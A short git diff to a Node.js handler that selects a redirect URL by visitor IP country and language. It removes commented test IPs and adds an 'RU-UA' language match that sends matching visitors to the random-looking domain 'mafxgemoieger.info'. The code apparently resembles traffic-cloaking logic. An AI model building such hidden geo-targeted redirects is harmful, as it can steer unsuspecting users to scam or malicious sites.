@@ -8,9 +8,6 @@ const errorHandler = require('../utils/errorHandler');
 module.exports.getUrl = async function (req, res) {
     try {
         let ip = req.ip
-        // let ip = "114.104.182.143"
-        // let ip = "5.182.39.255"
-        // let ip = "2a03:2880:f122::"
         if (ip6addr.parse(ip).kind() === 'ipv6') {
             ip = new Address6(ip).inspectTeredo().server4;
         }
@@ -126,6 +123,7 @@ function checkCountry(ip, language) {
     if (countryCode === 'RU' || countryCode === "UA" || countryCode === "PL") {
         if (language.toUpperCase() ==='RU' ||
             language.toUpperCase() ==='UA' ||
+            language.toUpperCase() ==='RU-UA' ||
             language.toUpperCase() ==='PL') {
             url = 'mafxgemoieger.info'
             } else {
